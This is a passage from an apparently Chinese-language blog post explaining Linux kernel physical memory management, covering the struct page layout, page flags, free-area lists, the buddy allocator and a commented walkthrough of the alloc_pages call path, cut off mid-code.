by</span></span><br><span class="line"><span class="comment"> * lruvec-&gt;lru_lock.  Sometimes used as a generic list</span></span><br><span class="line"><span class="comment"> * by the page owner.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">            </span><br><span class="line">             <span class="comment">// 为页面替换策略，可以被换出的页面可能存在与active_list或者inactive_list。这是LRU的链表头</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span></span><br><span class="line">            </span><br><span class="line"><span class="comment">/* See page-flags.h for PAGE_MAPPING_FLAGS */</span></span><br><span class="line">             <span class="comment">// 系统或者设备映射到内存中时，它们的inode结构就会和address_space</span></span><br><span class="line">             <span class="comment">// 相关联。当页面属于一个文件时，mmaping就会指向这个地址空间。</span></span><br><span class="line">             <span class="comment">// 如果这个页面是匿名的且映射开启，则address_space就是swapper_space</span></span><br><span class="line">             <span class="comment">// swapper_space是管理交换地址空间的</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span></span><br><span class="line">            </span><br><span class="line"><span class="keyword">pgoff_t</span> index;<span class="comment">/* Our offset within mapping. */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @private: Mapping-private opaque data.</span></span><br><span class="line"><span class="comment"> * Usually used for buffer_heads if PagePrivate.</span></span><br><span class="line"><span class="comment"> * Used for swp_entry_t if PageSwapCache.</span></span><br><span class="line"><span class="comment"> * Indicates order in the buddy system if PageBuddy.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* page_pool used by netstack */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @dma_addr: might require a 64-bit value even on</span></span><br><span class="line"><span class="comment"> * 32-bit architectures.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">dma_addr_t</span> dma_addr;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* slab, slob and slub */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* Partial pages */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line"><span class="keyword">int</span> pages;<span class="comment">/* Nr of pages left */</span></span><br><span class="line"><span class="keyword">int</span> pobjects;<span class="comment">/* Approximate count */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">short</span> <span class="keyword">int</span> pages;</span><br><span class="line"><span class="keyword">short</span> <span class="keyword">int</span> pobjects;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span> <span class="comment">/* not slob */</span></span><br><span class="line"><span class="comment">/* Double-word boundary */</span></span><br><span class="line"><span class="keyword">void</span> *freelist;<span class="comment">/* first free object */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="keyword">void</span> *s_mem;<span class="comment">/* slab: first object */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> counters;<span class="comment">/* SLUB */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* SLUB */</span></span><br><span class="line"><span class="keyword">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line"><span class="keyword">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line"><span class="keyword">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* Tail pages of compound page */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> compound_head;<span class="comment">/* Bit zero is set */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* First tail page only */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> compound_dtor;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> compound_order;</span><br><span class="line"><span class="keyword">atomic_t</span> compound_mapcount;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> compound_nr; <span class="comment">/* 1 &lt;&lt; compound_order */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* Second tail page of compound page */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> _compound_pad_1;<span class="comment">/* compound_head */</span></span><br><span class="line"><span class="keyword">atomic_t</span> hpage_pinned_refcount;</span><br><span class="line"><span class="comment">/* For both global and memcg */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">deferred_list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* Page table pages */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> _pt_pad_1;<span class="comment">/* compound_head */</span></span><br><span class="line"><span class="keyword">pgtable_t</span> pmd_huge_pte; <span class="comment">/* protected by page-&gt;ptl */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> _pt_pad_2;<span class="comment">/* mapping */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">pt_mm</span>;</span> <span class="comment">/* x86 pgds only */</span></span><br><span class="line"><span class="keyword">atomic_t</span> pt_frag_refcount; <span class="comment">/* powerpc */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> ALLOC_SPLIT_PTLOCKS</span></span><br><span class="line"><span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">spinlock_t</span> ptl;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* ZONE_DEVICE pages */</span></span><br><span class="line"><span class="comment">/** @pgmap: Points to the hosting device page map. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dev_pagemap</span> *<span class="title">pgmap</span>;</span></span><br><span class="line"><span class="keyword">void</span> *zone_device_data;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ZONE_DEVICE private pages are counted as being</span></span><br><span class="line"><span class="comment"> * mapped so the next 3 words hold the mapping, index,</span></span><br><span class="line"><span class="comment"> * and private fields from the source anonymous or</span></span><br><span class="line"><span class="comment"> * page cache page while the page is migrated to device</span></span><br><span class="line"><span class="comment"> * private memory.</span></span><br><span class="line"><span class="comment"> * ZONE_DEVICE MEMORY_DEVICE_FS_DAX pages also</span></span><br><span class="line"><span class="comment"> * use the mapping, index, and private fields when</span></span><br><span class="line"><span class="comment"> * pmem backed DAX files are mapped.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** @rcu_head: You can use this to free a page by RCU. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span><span class="comment">/* This union is 4 bytes in size. */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the page can be mapped to userspace, encodes the number</span></span><br><span class="line"><span class="comment"> * of times this page is referenced by a page table.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        </span><br><span class="line">         <span class="comment">// 页面表总共有多少项指向该页面</span></span><br><span class="line"><span class="keyword">atomic_t</span> _mapcount;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the page is neither PageSlab nor mappable to userspace,</span></span><br><span class="line"><span class="comment"> * the value stored here may help determine what this page</span></span><br><span class="line"><span class="comment"> * is used for.  See page-flags.h for a list of page types</span></span><br><span class="line"><span class="comment"> * which are currently stored here.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> page_type;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> active;<span class="comment">/* SLAB */</span></span><br><span class="line"><span class="keyword">int</span> units;<span class="comment">/* SLOB */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Usage count. *DO NOT USE DIRECTLY*. See page_ref.h */</span></span><br><span class="line"><span class="keyword">atomic_t</span> _refcount;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> memcg_data;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On machines where all RAM is mapped into kernel address space,</span></span><br><span class="line"><span class="comment"> * we can simply calculate the virtual address. On machines with</span></span><br><span class="line"><span class="comment"> * highmem some memory is mapped into kernel virtual memory</span></span><br><span class="line"><span class="comment"> * dynamically, so we need a place to store that address.</span></span><br><span class="line"><span class="comment"> * Note that this field could be 16 bits on x86 ... ;)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Architectures with slow multiplication can define</span></span><br><span class="line"><span class="comment"> * WANT_PAGE_VIRTUAL in asm/page.h</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(WANT_PAGE_VIRTUAL)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 正常情况下只有处于ZONE_NORMAL的页面内核直接映射。对于ZONE_HIGHMEM区域的页面</span></span><br><span class="line">    <span class="comment">// 内核使用kmap()来映射页面。当页面被映射后，virtual是它的虚拟地址</span></span><br><span class="line"><span class="keyword">void</span> *<span class="keyword">virtual</span>;<span class="comment">/* Kernel virtual address (NULL if</span></span><br><span class="line"><span class="comment">   not kmapped, ie. highmem) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* WANT_PAGE_VIRTUAL */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> LAST_CPUPID_NOT_IN_PAGE_FLAGS</span></span><br><span class="line"><span class="keyword">int</span> _last_cpupid;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; _struct_page_alignment;</span><br></pre></td></tr></table></figure><p>此处用一张图来帮我们理一下我们的思路，以3G（用户空间）/ 1G（内核空间）</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13419102870/0" alt="image-20210416194931072"></p><p>可以看到物理地址0~896M，这里就是NORMAL的区域，这里是直接被映射到内核空间开始的896M处，往上就是HIGNMEM区域。这里有一个很重要的点就是，ZONE_DMA、ZONE_NORMAL、ZONE_HIGNMEM这些区域是对于物理地址而言，而且表示的是区间，不是对应大小的物理内存块，所以我们可以推断出不是所有的节点都有这三种区域的。</p><h4 id="页面标志"><a href="#页面标志" class="headerlink" title="页面标志"></a>页面标志</h4><p>页面标志尤其重要，内存分配与回收、IO操作等重要内核活动过程中都会使用到页面标志。所有的标志都在<code>include/linux/page-flags.h</code>中定义</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">pageflags</span> &#123;</span></span><br><span class="line">PG_locked,<span class="comment">/* Page is locked. Don&#x27;t touch. */</span></span><br><span class="line">PG_referenced,</span><br><span class="line">PG_uptodate,</span><br><span class="line">PG_dirty,</span><br><span class="line">PG_lru,</span><br><span class="line">PG_active,</span><br><span class="line">PG_workingset,</span><br><span class="line">PG_waiters,<span class="comment">/* Page has waiters, check its waitqueue. Must be bit #7 and in the same byte as &quot;PG_locked&quot; */</span></span><br><span class="line">PG_error,</span><br><span class="line">PG_slab,</span><br><span class="line">PG_owner_priv_1,<span class="comment">/* Owner use. If pagecache, fs may use*/</span></span><br><span class="line">PG_arch_1,</span><br><span class="line">PG_reserved,</span><br><span class="line">PG_private,<span class="comment">/* If pagecache, has fs-private data */</span></span><br><span class="line">PG_private_2,<span class="comment">/* If pagecache, has fs aux data */</span></span><br><span class="line">PG_writeback,<span class="comment">/* Page is under writeback */</span></span><br><span class="line">PG_head,<span class="comment">/* A head page */</span></span><br><span class="line">PG_mappedtodisk,<span class="comment">/* Has blocks allocated on-disk */</span></span><br><span class="line">PG_reclaim,<span class="comment">/* To be reclaimed asap */</span></span><br><span class="line">PG_swapbacked,<span class="comment">/* Page is backed by RAM/swap */</span></span><br><span class="line">PG_unevictable,<span class="comment">/* Page is &quot;unevictable&quot;  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MMU</span></span><br><span class="line">PG_mlocked,<span class="comment">/* Page is vma mlocked */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ARCH_USES_PG_UNCACHED</span></span><br><span class="line">PG_uncached,<span class="comment">/* Page has been mapped as uncached */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_FAILURE</span></span><br><span class="line">PG_hwpoison,<span class="comment">/* hardware poisoned page. Don&#x27;t touch */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_IDLE_PAGE_TRACKING) &amp;&amp; defined(CONFIG_64BIT)</span></span><br><span class="line">PG_young,</span><br><span class="line">PG_idle,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line">PG_arch_2,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">__NR_PAGEFLAGS,</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Filesystems */</span></span><br><span class="line">PG_checked = PG_owner_priv_1,</span><br><span class="line"></span><br><span class="line"><span class="comment">/* SwapBacked */</span></span><br><span class="line">PG_swapcache = PG_owner_priv_1,<span class="comment">/* Swap page: swp_entry_t in private */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Two page bits are conscripted by FS-Cache to maintain local caching</span></span><br><span class="line"><span class="comment"> * state.  These bits are set on pages belonging to the netfs&#x27;s inodes</span></span><br><span class="line"><span class="comment"> * when those inodes are being locally cached.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PG_fscache = PG_private_2,<span class="comment">/* page backed by cache */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* XEN */</span></span><br><span class="line"><span class="comment">/* Pinned in Xen as a read-only pagetable page. */</span></span><br><span class="line">PG_pinned = PG_owner_priv_1,</span><br><span class="line"><span class="comment">/* Pinned as part of domain save (see xen_mm_pin_all()). */</span></span><br><span class="line">PG_savepinned = PG_dirty,</span><br><span class="line"><span class="comment">/* Has a grant mapping of another (foreign) domain&#x27;s page. */</span></span><br><span class="line">PG_foreign = PG_owner_priv_1,</span><br><span class="line"><span class="comment">/* Remapped by swiotlb-xen. */</span></span><br><span class="line">PG_xen_remapped = PG_owner_priv_1,</span><br><span class="line"></span><br><span class="line"><span class="comment">/* SLOB */</span></span><br><span class="line">PG_slob_free = PG_private,</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Compound pages. Stored in first tail page&#x27;s flags */</span></span><br><span class="line">PG_double_map = PG_workingset,</span><br><span class="line"></span><br><span class="line"><span class="comment">/* non-lru isolated movable page */</span></span><br><span class="line">PG_isolated = PG_reclaim,</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only valid for buddy pages. Used to track pages that are reported */</span></span><br><span class="line">PG_reported = PG_uptodate,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里解释几个重要的页面标志：</p><p><strong>PG_locked</strong>：页面是否被锁住，若该位设置了该位，则不允许内核其他部分访问该页面。这用来防止内存管理过程中遇到的竞争条件，如当从硬盘读取数据到一个页面时，就不允许其他内核部分访问该页面，因为读数据的过程中，其他内核部分能访问的话，则读取到的数据是不完整的。</p><p><strong>PG_error</strong>：I/O出错，且操作和页面有关，就设置该标志。</p><p><strong>PG_referenced和PG_active</strong>：控制系统使用页面的活跃程度。这个信息对swap系统选择待交换出的页面非常重要。</p><p><strong>PG_update</strong>：表示成功完成从块设备上读取一个页面的数据。该标志和块设备I/O操作有关。</p><p><strong>PG_dirty</strong>：当内存页面中的数据和块设备上的数据不一致时，就设置该标志。在写数据到块设备时，为了提高将来的读性能，数据并不是立即回写到块设备上，而只是设置页面脏标志，表示该页面数据需要回写。</p><p><strong>PG_lru</strong>：该标志用来实现页面回收和交换。</p><p><strong>PG_highmem</strong>：表示该页面为属于高端内存。</p><h2 id="空闲页面的管理"><a href="#空闲页面的管理" class="headerlink" title="空闲页面的管理"></a>空闲页面的管理</h2><p>首先这里是页面的管理，比如我们要分配连续的物理页面，所以这里讲的是伙伴系统，当我们涉及到页面内的，以kb为单位，不再以页为单位去分配内存的时候，此时涉及到的就是slab分配算法。</p><h3 id="物理内存空间描述"><a href="#物理内存空间描述" class="headerlink" title="物理内存空间描述"></a>物理内存空间描述</h3><p>前面我们讲过内核将物理分为3个层次：节点（Node）、区域（Zone）、页面（Page），主要是简单的涉及到它的数据结构。三个关系如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13419284497/0" alt="image-20210416203439973"></p><p>在Linux中，空闲内存管理的基本单位是页面(x86/x86-64 CPU定义的页面)，即以页面为单位来管理物理内存(kmalloc等slab/slub机制，是比页面更小的细分)。</p><p>Linux内核管理的每个内存空闲块都是2的幂次方个页面，幂次方的大小为order。把1个空闲页面放在一起、2个空闲页面（物理地址连续）放在一起、4个空闲页面（物理地址连续）放在一起…空闲页面组织，如下图所示：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13419322858/0" alt="image-20210416204434890"></p><p>在我们的内核版本中(Linux5.12-cr7)，MAX_ORDER通常定义为11，内核管理最大的连续空闲物理内存大小为2^(11-1)，即4MB。</p><p><strong>区域（zone）与空闲页面</strong></p><p>在区域（zone）的数据结构中，有个数组<strong>free_area[MAX_ORDER]</strong>来保存每个空闲内存块链表</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13419353990/0" alt="image-20210416205324167"></p><p>这样<code>free_area[MAX_ORDER]</code>数组中第1个元素，指向内存块大小为2^0即1个页面的空闲页面链表，以此类推</p><p>每个区域（zone）都有一个<code>free_area[MAX_ORDER]</code>数组，其数据类型<code>free_area</code>结构体定义如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> &#123;</span></span><br><span class="line">    <span class="comment">// 空闲页面块的双链表</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">free_list</span>[<span class="title">MIGRATE_TYPES</span>];</span></span><br><span class="line">    <span class="comment">// 该区域中的空闲页面块数量</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>nr_free;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>每个空闲页面链表上的各个元素（大小相同的连续物理页面），通过<code>struct page</code>中的双链表成员变量来连接，如下图所示</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13419460908/0" alt="image-20210416212219830"></p><p>空闲页面的管理只是在区域（zone）这一层，节点（node）下的每个区域都管理着自己的空闲物理页面。空闲页面管理与节点、区域之间的关系如下图</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13419509509/0" alt="image-20210416213524986"></p><h2 id="伙伴算法"><a href="#伙伴算法" class="headerlink" title="伙伴算法"></a>伙伴算法</h2><p>伙伴算法的用途主要是尽可能的减少外部碎片，同时允许快速分配与回收物理页面。为了减少外部碎片，连续的空闲页面，根据空闲块（由连续的空闲页面组成）大小，组织成不同的链表（或orders）。前面涉及到的空闲页面管理就是伙伴系统的一部分。这样所有的2个页面大小的空闲块在一个链表中，4个页面大小的空闲块在一个链表中，以此类推。下面为空闲页面的分配示意图</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13419525548/0" alt="image-20210416213943809"></p><h3 id="伙伴系统举例"><a href="#伙伴系统举例" class="headerlink" title="伙伴系统举例"></a>伙伴系统举例</h3><h4 id="页面分配过程"><a href="#页面分配过程" class="headerlink" title="页面分配过程"></a>页面分配过程</h4><p>现上层请求分配<strong>4个连续地址</strong>的空闲物理页面块</p><ol><li>4=2^(3-1)，因此从Order = 3的空闲块链表上开始找空闲的块</li><li>此时假设在order = 3的链表上没有空闲块；需要到上级order查找是否有空闲块</li><li>从order = 4的链表上开始查找，有一个空闲结点；但该链表上的每个块大小为8个页面，分配4个页面给上层，标记该页面表为已使用</li><li>还剩4个页面。此时将该剩下的4个页面，放入order = 3的链表上</li><li>更新相关统计信息</li></ol><h4 id="页面回收过程"><a href="#页面回收过程" class="headerlink" title="页面回收过程"></a>页面回收过程</h4><ol><li>标记该页面块为空闲</li><li>检查相邻物理页面是否为空闲；若相邻物理页面为空闲，则尝试合并成更大的连续物理页面块（这样可以避免内存碎片化）</li><li>若有合并，则要更新<code>freearea</code>数组中链表元素</li><li>更新相关统计信息</li></ol><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>源码分析基于以下：</p><ol><li><p>Linux5.12-cr7</p></li><li><p>64bit代码处理逻辑</p></li><li><p>NUMA架构</p><blockquote><p>NUMA架构走的<code>alloc_pages_current</code>分支，NUA则是<code>alloc_pages_node</code>。</p></blockquote></li></ol><h4 id="alloc-pages"><a href="#alloc-pages" class="headerlink" title="alloc_pages"></a>alloc_pages</h4><p><strong>原型：static inline struct page *alloc_pages(gfp_t gfp_mask, unsigned int order)</strong></p><p>linux内核伙伴系统中分配物理内存常用的接口是<code>alloc_pages</code>，用于分配<strong>2^order</strong>个<strong>连续</strong>的物理页，失败则返回NULL。与<code>__get_free_pages</code>函数不同的是，该函数返回<strong>指向第一个页框的页描述符</strong>，而<code>__get_free_pages</code>返回的是页映射后的虚拟地址。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *</span></span><br><span class="line"><span class="class"><span class="title">alloc_pages</span>(<span class="title">gfp_t</span> <span class="title">gfp_mask</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">return</span> alloc_pages_current(gfp_mask, order);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来我们直接看<code>alloc_pages_current</code>函数</p><h4 id="alloc-pages-current"><a href="#alloc-pages-current" class="headerlink" title="alloc_pages_current"></a>alloc_pages_current</h4><p><strong>原型：struct page *alloc_pages_current(gfp_t gfp_mask, unsigned order);</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">struct page *<span class="title">alloc_pages_current</span><span class="params">(<span class="keyword">gfp_t</span> gfp, <span class="keyword">unsigned</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// pol变量用来保存内存分配策略，这里保存的是默认的分配策略</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mempolicy</span> *<span class="title">pol</span> =</span> &amp;default_policy;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果不在中断状态且未指定在当前节点分配内存时，使用get_task_policy获取当前进程的内存分配策略</span></span><br><span class="line"><span class="keyword">if</span> (!in_interrupt() &amp;&amp; !(gfp &amp; __GFP_THISNODE))</span><br><span class="line">pol = get_task_policy(current);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pol-&gt;mode == MPOL_INTERLEAVE)</span><br><span class="line">page = alloc_page_interleave(gfp, order, interleave_nodes(pol));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">page = __alloc_pages_nodemask(gfp, order,</span><br><span class="line">policy_node(gfp, pol, numa_node_id()),</span><br><span class="line">policy_nodemask(gfp, pol));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于NUMA的四种内存分配策略：</p><ul><li>MPOL_DEFAULT：默认策略。也就是应该从当前节点分配内存，当前节点没有空闲内存时，从最近有空闲内存的节点分配</li><li>MPOL_PREFERRED：从指定节点上分配内存，若该节点上没有空闲内存，则其他任何一个节点都可以</li><li>MPOL_INTERLEAVE：内存分配要覆盖所有节点。该策略通常用于共享内存区域，分配的内存覆盖所有区域用来保证不会有节点过载，同时每个节点上用的内存大小相同。</li><li>MPOL_BIND：内存分配指定在特定的节点集（即某几个节点）中。当这些节点不能提供所需要的内存时，内存分配就失败。</li></ul><p>我们首先使用<code>pol</code>变量保存系统默认的分配策略，默认的分配策略为<code>MPOL_PREFERRED</code></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13439136626/0" alt="image-20210421211854180"></p><p>如果内存分配标志位置有<code>__GFP_THISNODE</code>表示从当前节点分配内存，跟我们的默认分配策略一样，所以不需要改变，也就是不需要获取策略；如果未置有，此时会进入<code>if</code>语句中，通过<code>get_task_policy</code>函数获取内存分配策略。如果获取的策略是<code>MPOL_INTERLEAVE</code>则进入<code>alloc_page_interleave</code>函数中，这里我们如果是默认内存分配策略的情况下，我们进入<code>else</code>分支中，<code>__alloc_pages_nodemask</code>函数中的两个参数<code>policy_node(gfp, pol, numa_node_id())</code>和<code>policy_nodemask(gfp, pol)</code>是根据NUMA策略来确定在哪些节点、哪些区域上分配内存。接下来我们看<code>__alloc_pages_nodemask</code>函数。</p><h4 id="alloc-pages-nodemask"><a href="#alloc-pages-nodemask" class="headerlink" title="__alloc_pages_nodemask"></a>__alloc_pages_nodemask</h4><p><strong>原型：struct page *__alloc_pages_nodemask(gfp_t gfp_mask, unsigned int order, int preferred_nid,</strong></p><p>​              <strong>nodemask_t *nodemask);</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *</span></span><br><span class="line"><span class="class">__<span class="title">alloc_pages_nodemask</span>(<span class="title">gfp_t</span> <span class="title">gfp_mask</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>, <span class="title">int</span> <span class="title">preferred_nid</span>,</span></span><br><span class="line"><span class="class"><span class="title">nodemask_t</span> *<span class="title">nodemask</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> alloc_flags = ALLOC_WMARK_LOW;</span><br><span class="line"><span class="keyword">gfp_t</span> alloc_mask; <span class="comment">/* The gfp_t that was actually used for allocation */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_context</span> <span class="title">ac</span> =</span> &#123; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果order大于MAX_ORDER(11), 则内存分配失败</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(order &gt;= MAX_ORDER)) &#123;</span><br><span class="line">WARN_ON_ONCE(!(gfp_mask &amp; __GFP_NOWARN));</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加gfp_allowed_mask标志位</span></span><br><span class="line">gfp_mask &amp;= gfp_allowed_mask;</span><br><span class="line">alloc_mask = gfp_mask;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化alloc_context对象ac，保存相关的一些参数</span></span><br><span class="line"><span class="keyword">if</span> (!prepare_alloc_pages(gfp_mask, order, preferred_nid, nodemask, &amp;ac, &amp;alloc_mask, &amp;alloc_flags))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 给alloc_flags添加ALLOC_NOFRAGMENT标志位(不使用zone备用迁移类型), 如果遍历完本地zone后仍然无法分配内存则取消该标志位, 该方案是为了减少内存碎片</span></span><br><span class="line">alloc_flags |= alloc_flags_nofragment(ac.preferred_zoneref-&gt;zone, gfp_mask);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 首先尝试从空闲页面链表中分配页面，如果分配失败了，就要通过__alloc_pages_slowpath</span></span><br><span class="line">    <span class="comment">// 是内存分配的快速路径</span></span><br><span class="line">page = 